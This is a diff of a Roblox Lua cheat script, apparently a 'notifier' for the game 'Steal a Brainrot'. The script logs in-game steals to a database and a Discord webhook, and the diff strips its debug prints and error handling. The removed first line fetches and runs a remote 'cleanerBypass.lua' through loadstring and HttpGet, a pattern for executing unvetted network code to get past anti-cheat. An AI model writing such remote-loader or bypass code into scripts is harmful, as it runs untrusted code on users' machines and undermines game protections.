@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/donkidonn/steal-a-brainrot-finder-script/refs/heads/main/cleanerBypass.lua"))()
-
 repeat task.wait() until game:IsLoaded()
 
 -- Config
@@ -454,7 +452,6 @@ local function getUserFromKey()
             cachedDiscordId = data[1].discord_id
             cachedUsername  = data[1].username
             cachedUserId    = data[1].id
-            print("User found: " .. (cachedUsername or "?") .. " | Discord: " .. (cachedDiscordId or "?"))
             return cachedDiscordId, cachedUsername, cachedUserId
         end
     end
@@ -488,22 +485,14 @@ end
 -- Send steal to database
 local function sendStealToDatabase(info)
     local http = getHttp()
-    if not http then print("[DB] No http function available") return end
+    if not http then return end
 
     local valuePerSec = parseValue(info.value)
     local tier = getDbTier(info.rarity, valuePerSec)
 
-    print("[DB] Raw value: " .. tostring(info.value) .. " → parsed: " .. tostring(valuePerSec) .. "/s")
-    print("[DB] Rarity: " .. tostring(info.rarity) .. " → tier: " .. tostring(tier))
-
-    -- Below 50M/s — don't log to website
-    if not tier then
-        print("[DB] Below threshold, skipping website log")
-        return
-    end
+    if not tier then return end
 
     local discordId, username, userId = getUserFromKey()
-    print("[DB] User lookup → userId: " .. tostring(userId) .. " | discord: " .. tostring(discordId))
 
     -- Insert into steals table (website stats, leaderboard, charts)
     if userId then
@@ -529,21 +518,8 @@ local function sendStealToDatabase(info)
                     })
                 })
             end)
-            if ok then
-                local statusCode = result and (result.StatusCode or result.status) or "?"
-                print("[DB] Steals insert response: " .. tostring(statusCode))
-                if tostring(statusCode):sub(1,1) == "2" then
-                    print("[DB] ✓ Steal logged! [" .. tier:upper() .. "] " .. info.name)
-                else
-                    local body = result and (result.Body or result.body) or "no body"
-                    print("[DB] ✗ Insert failed — status " .. tostring(statusCode) .. " | " .. tostring(body))
-                end
-            else
-                print("[DB] ✗ HTTP error: " .. tostring(result))
-            end
+            _ = ok
         end)
-    else
-        print("[DB] ✗ User not found for luarmor_key — steal not logged")
     end
 
     -- Insert into brainrot-steals for full raw record
@@ -579,10 +555,7 @@ local function sendStealWebhook(info)
     -- Same threshold as DB — only log steals worth 50M/s+ (or OG rarity)
     local valuePerSec = parseValue(info.value)
     local tier = getDbTier(info.rarity, valuePerSec)
-    if not tier then
-        print("[Webhook] Below threshold (" .. tostring(valuePerSec) .. "/s), skipping")
-        return
-    end
+    if not tier then return end
 
     local imageUrl = getImageUrl(info.name)
     local unixTime = os.time()
@@ -1029,15 +1002,6 @@ for _, v in pairs(net:GetChildren()) do
                     if not lastStolenInfo then return end
                     local i = lastStolenInfo
 
-                    print("=== STEAL CONFIRMED ===")
-                    print("Name:     " .. i.name)
-                    print("Value:    " .. i.value)
-                    print("Mutation: " .. i.mutation)
-                    print("Rarity:   " .. i.rarity)
-                    print("Price:    " .. i.price)
-                    print("Time:     " .. os.date("%X"))
-                    print("=======================")
-
                     task.spawn(function()
                         sendStealToDatabase(i)
                         sendStealWebhook(i)
@@ -1050,5 +1014,4 @@ for _, v in pairs(net:GetChildren()) do
     end
 end
 
-print("Grand Notifier running!")
 statusLbl.Text = "watching for brainrots..."
